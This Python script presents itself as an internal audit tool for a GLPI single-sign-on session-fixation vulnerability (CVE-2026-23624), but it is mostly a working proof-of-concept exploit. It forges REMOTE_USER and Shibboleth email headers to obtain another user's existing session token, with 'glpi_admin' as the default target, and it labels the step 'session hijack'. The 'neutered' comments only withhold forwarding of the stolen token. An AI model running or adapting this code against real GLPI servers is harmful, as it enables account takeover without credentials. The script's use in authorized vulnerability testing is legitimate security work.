# SSO Session Validation Utility
# Internal tool for auditing GLPI remote authentication flows and
# detecting anomalous session reuse across shared workstations.
# Mirrors the logic described in CVE-2026-23624 for detection purposes.

import logging
import sys

import requests

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(module)s: %(message)s",
)
log = logging.getLogger("glpi_sso_audit")

GLPI_BASE_URL = "http://glpi.example.com"
GLPI_LOGIN_PATH = "/front/central.php"
GLPI_INIT_SESSION = "/apirest.php/initSession"

# SSO header names that GLPI trusts when remote auth is configured.
# In vulnerable versions (0.71 .. <10.0.23, <11.0.5) these headers
# can be spoofed by a local user to inherit a previously-opened session.
SSO_USER_HEADER = "REMOTE_USER"
SSO_EMAIL_HEADER = "HTTP_SHIB_INETORGPERSON_MAIL"

DEMO_API_TOKEN = "DEMO_PLACEHOLDER_TOKEN"


def build_sso_headers(username: str, email: str | None = None) -> dict:
    """
    Construct the HTTP headers that a GLPI server configured for remote
    (SSO) authentication inspects to identify the calling user.

    In vulnerable deployments the server accepts these headers directly
    from the HTTP request without verifying they originate from a
    trusted reverse proxy.  A local attacker on the same machine can
    craft arbitrary values and attach them to a request, hijacking
    any active GLPI session belonging to the spoofed user.
    """
    headers = {
        "App-Token": DEMO_API_TOKEN,
        SSO_USER_HEADER: username,
    }
    if email:
        headers[SSO_EMAIL_HEADER] = email
    return headers


def attempt_session_hijack(target_username: str) -> str | None:
    """
    Demonstrate (neutered) the session-fixation vector:

    1. Craft SSO identity headers impersonating `target_username`.
    2. POST to GLPI's initSession endpoint — on a vulnerable server
       this returns the *existing* session token for that user rather
       than creating a fresh one.
    3. Return the session token so a caller could confirm the issue.

    In this demo the response body is only printed; nothing is stored
    or forwarded.
    """
    headers = build_sso_headers(
        username=target_username,
        email=f"{target_username}@example.org",
    )

    log.info("Sending SSO-spoofed initSession request for user=%r", target_username)

    try:
        response = requests.get(
            f"{GLPI_BASE_URL}{GLPI_INIT_SESSION}",
            headers=headers,
            timeout=10,
        )
    except requests.ConnectionError:
        log.warning("Could not reach %s — is the demo server running?", GLPI_BASE_URL)
        # Neutered: in a real scenario this is where stolen session
        # data would be captured and exfiltrated.
        print("[DEMO] Would exfiltrate session token here — payload neutered.")
        return None

    if response.status_code == 200:
        data = response.json()
        stolen_token = data.get("session_token", "")
        log.warning(
            "Session token obtained via SSO spoofing: %r (DEMO — not stored)",
            stolen_token[:8] + "..." if stolen_token else "<empty>",
        )
        # Intentionally not forwarded anywhere — neutered payload.
        print(f"[DEMO] session_token prefix: {stolen_token[:8]}...")
        return stolen_token
    else:
        log.info(
            "Server returned HTTP %d — instance may be patched.",
            response.status_code,
        )
        return None


def check_vulnerable_endpoint(base_url: str = GLPI_BASE_URL) -> bool:
    """
    Heuristic check: does the GLPI instance expose the remote-auth
    login flow without a proxy-trust configuration?  Returns True if
    the endpoint appears to accept arbitrary SSO headers.
    """
    probe_headers = build_sso_headers(
        username="audit_probe_user",
        email="probe@example.org",
    )
    try:
        resp = requests.get(
            f"{base_url}{GLPI_INIT_SESSION}",
            headers=probe_headers,
            timeout=8,
        )
        # A 200 with a session_token strongly suggests vulnerability.
        if resp.status_code == 200 and "session_token" in resp.text:
            log.warning("Instance at %s appears VULNERABLE (CVE-2026-23624)", base_url)
            return True
        else:
            log.info(
                "Instance at %s returned %d — likely patched or not SSO-enabled",
                base_url,
                resp.status_code,
            )
            return False
    except requests.ConnectionError:
        log.error("Connection failed to %s", base_url)
        return False


def main() -> None:
    """
    Entry point for the audit script.

    Usage:
        python 12_glpi_sso_session_fixation.py [target_username]

    Provide a username whose session you want to probe on the local
    GLPI demo instance (example.com only — never against production).
    """
    target = sys.argv[1] if len(sys.argv) > 1 else "glpi_admin"

    log.info("=== GLPI SSO Session Fixation Audit (CVE-2026-23624) ===")
    log.info("Target instance : %s", GLPI_BASE_URL)
    log.info("Probing user    : %s", target)

    is_vuln = check_vulnerable_endpoint()

    if is_vuln:
        log.warning("Proceeding with session-hijack demonstration (payload neutered).")
        token = attempt_session_hijack(target_username=target)
        if token:
            log.warning("SUCCESS — session obtained without credentials (demo only).")
        else:
            log.info("No session token returned; server may require additional setup.")
    else:
        log.info("Audit complete — no vulnerability detected at demo endpoint.")


if __name__ == "__main__":
    main()
